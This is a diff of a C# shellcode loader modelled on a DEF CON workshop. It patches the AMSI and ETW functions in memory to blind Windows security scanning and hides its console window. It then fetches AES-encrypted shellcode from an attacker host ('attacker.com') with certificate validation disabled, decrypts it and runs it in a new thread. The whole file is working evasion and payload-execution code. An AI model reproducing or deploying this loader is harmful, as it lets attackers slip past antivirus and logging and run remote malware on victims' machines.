@@ -6,9 +6,11 @@ using System.Security.Cryptography.X509Certificates;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
+// inspiration from: https://github.com/H0K5/defcon27_csharp_workshop
+
+
 public class Win32
 {
-    // https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v%3Dvs.85)
     [StructLayout(LayoutKind.Sequential)]
     public class SecurityAttributes
     {
@@ -17,7 +19,6 @@ public class Win32
         public bool bInheritHandle = false;
         public SecurityAttributes() { this.Length = Marshal.SizeOf(this); }
     }
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
     [StructLayout(LayoutKind.Sequential)]
     public struct ProcessInformation
     {
@@ -26,7 +27,6 @@ public class Win32
         public Int32 dwProcessId;
         public Int32 dwThreadId;
     }
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     [StructLayout(LayoutKind.Sequential)]
     public class StartupInfo
     {
@@ -50,7 +50,6 @@ public class Win32
         public IntPtr hStdError = IntPtr.Zero;
         public StartupInfo() { this.cb = Marshal.SizeOf(this); }
     }
-    // https://docs.microsoft.com/en-gb/windows/win32/procthread/process-creation-flags
     [Flags]
     public enum CreateProcessFlags : uint
     {
@@ -85,55 +84,42 @@ public class Win32
         PROFILE_SERVER = 0x40000000,
         CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
     }  
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     [DllImport("kernel32")]
     public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, 
         SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, 
         Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, 
         String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, 
         out ProcessInformation lpProcessInformation);
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     [DllImport("kernel32")]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, 
         UInt32 flAllocationType, UInt32 flProtect);
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
         UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     [DllImport("kernel32")]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
         byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
     [DllImport("kernel32")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
     [DllImport("kernel32")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, 
         uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
         IntPtr lpThreadId);
-    // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport("kernel32")]
-    // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
     public static extern IntPtr LoadLibrary(string name);
     [DllImport("kernel32")]
-    // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary
     public static extern bool FreeLibrary(IntPtr hModule);
-    // https://docs.microsoft.com/en-us/windows/console/getconsolewindow
     [DllImport("kernel32")]
     public static extern IntPtr GetConsoleWindow();
-    // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
     [DllImport("user32")]
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);   
-    // https://docs.microsoft.com/en-gb/windows/win32/procthread/process-security-and-access-rights
     public static int PROCESS_CREATE_THREAD = 0x0002;
     public static int PROCESS_QUERY_INFORMATION = 0x0400;
     public static int PROCESS_VM_OPERATION = 0x0008;
     public static int PROCESS_VM_WRITE = 0x0020;
     public static int PROCESS_VM_READ = 0x0010;
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     public static UInt32 MEM_COMMIT = 0x1000;
     public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
     public static UInt32 PAGE_EXECUTE_READ = 0x20;
@@ -171,17 +157,12 @@ public class Encrypt
 
 public class EVASION
 {   
-    // ASB Patches
     static byte[] amsix64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
     static byte[] amsix86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-    // EtwEventWrite Patches
     static byte[] etwx64 = new byte[] { 0x48, 0x33, 0xc0, 0xc3 };
     static byte[] etwx86 = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
 
-    private static string decode(string b64encoded)
-    {
-        return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
-    }
+ 
     public static void PatchAll()
     {
         PatchETW();
@@ -191,31 +172,26 @@ public class EVASION
     {
         if (IntPtr.Size == 8)
         {
-            // 64 bits process
             Console.WriteLine("[>] 64-bits Process");
-            PatchMem(etwx64, "nt" + "dll" + "." + "dll", "RtlInitializeResource", 0x1ed60); // 0x1ed60 to EtwEventWrite
+            PatchMem(etwx64, "ntdll.dll", "RtlInitializeResource", 0x1ed60); 
         }
         else 
         {
-            // 32 bits process
             Console.WriteLine("[>] 32-bits Process");
-            PatchMem(etwx86, "nt" + "dll" + "." + "dll", "RtlInitializeResource", 0x590); // 0x590 to EtwEventWrite
+            PatchMem(etwx86, "ntdll.dll", "RtlInitializeResource", 0x590); // 0x590 to EtwEventWrite
         }
     }
     public static void PatchASB()
     {
-        string dll = decode("YW1zaS5kbGw=");
         if (IntPtr.Size == 8)
         {
-            // 64 bits process
             Console.WriteLine("[>] 64-bits Process");
-            PatchMem(amsix64, dll, "DllGetClassObject", 0xcb0); // 0xcb0 to AmsiScanBuffer
+            PatchMem(amsix64, "amsi.dll", "DllGetClassObject", 0xcb0); 
         }
         else
         {
-            // 32 bits process
             Console.WriteLine("[>] 32-bits Process");
-            PatchMem(amsix86, dll, "DllGetClassObject", 0x970); // 0x970 to AmsiScanBuffer
+            PatchMem(amsix86, "amsi.dll", "DllGetClassObject", 0x970); 
         }
     }
 
@@ -225,23 +201,23 @@ public class EVASION
         {
             uint newProtect;
             uint oldProtect;
-            // Get library address
+
             IntPtr libPtr = Win32.LoadLibrary(library);
             Console.WriteLine("[>] {0}: 0x{1}", library, libPtr.ToString("X"));
-            // Get function address
+
             IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);
-            // Jump to the real function adddress if offset is used
+
             if (offset != 0)
             {
                 functionPtr = new IntPtr(functionPtr.ToInt64() + offset);
                 Console.WriteLine("[>] {0} + 0x{1} address: 0x{2}", function, offset.ToString("X"), functionPtr.ToString("X"));
             }
             else { Console.WriteLine("[>] {0} address: 0x{1}", function, functionPtr.ToString("X")); }
-            // Change memory permissions to PAGE_EXECUTE_READWRITE
+
             Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
-            // Patch function
+
             Marshal.Copy(patch, 0, functionPtr, patch.Length);
-            // Restore memory permissions
+
             Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
             Win32.FreeLibrary(libPtr);
             Console.WriteLine("[+] Patch Done");
@@ -259,34 +235,25 @@ public class Program
 {
     public static void RunShellcode(byte[] shellcode)
     {
-        // Allocate process memory with PAGE_READWRITE permissions
         UInt32 codeAddr = Win32.VirtualAlloc(0, (UInt32)shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
-        // Copy shellcode into the allocated memory
         Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
-        // Change memory permissions to PAGE_EXECUTE_READ
         uint oldProtect;
         Win32.VirtualProtect((IntPtr)codeAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
-        // Execute shellcode
         IntPtr threadHandle = IntPtr.Zero;
         UInt32 threadId = 0;
         IntPtr parameter = IntPtr.Zero;
         threadHandle = Win32.CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
-        // Wait for the thread to finish
         Win32.WaitForSingleObject(threadHandle, 0xFFFFFFFF);
 
     }
 
     public static byte[] downloader(string shellcode_url)
     {
-        // Downloads data from an url and return its content 
         WebClient wc = new WebClient();
         wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
         ServicePointManager.Expect100Continue = true;
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-        // Ignore Certificate Check, remove on production!
-        // https://stackoverflow.com/questions/12506575/how-to-ignore-the-certificate-check-when-ssl
         ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-        // End of ignore Certificate Check
         byte[] shellcode = wc.DownloadData(shellcode_url);
         return shellcode;
     }
@@ -295,13 +262,11 @@ public class Program
     public static void Main(string[] args)
     {
         EVASION.PatchAll();
-        
-        // Hide Process Window
         var handle = Win32.GetConsoleWindow();
         Win32.ShowWindow(handle, Win32.SW_HIDE);
         string url = args[0];
         byte[] shellcode = downloader("https://attacker.com/shellcode");
-        byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("idkidkidkidkidkidkkeykeykeykey"));
+        byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("key"));
         Console.WriteLine("[<] {0} Bytes Downloaded!", shellcode.Length);
         shellcode = Encrypt.AES_Decrypt(shellcode, password);
         Console.WriteLine("[+] Decrypted shellcode size: {0}", shellcode.Length);
